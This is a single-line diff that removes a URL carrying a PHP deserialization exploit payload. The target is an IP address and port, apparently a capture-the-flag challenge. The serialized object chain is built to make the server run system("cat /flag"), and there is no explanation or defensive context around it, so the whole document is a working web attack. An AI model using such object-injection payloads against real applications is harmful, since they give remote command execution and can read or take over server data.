@@ -1,1 +1,0 @@
-﻿http://117.139.247.14:9759/index.php?string=O:6:"yemoli":2:{s:8:"%00*%00alive";O:3:"bad":1:{s:9:"%00bad%00code";s:20:"system("cat /flag");";}}
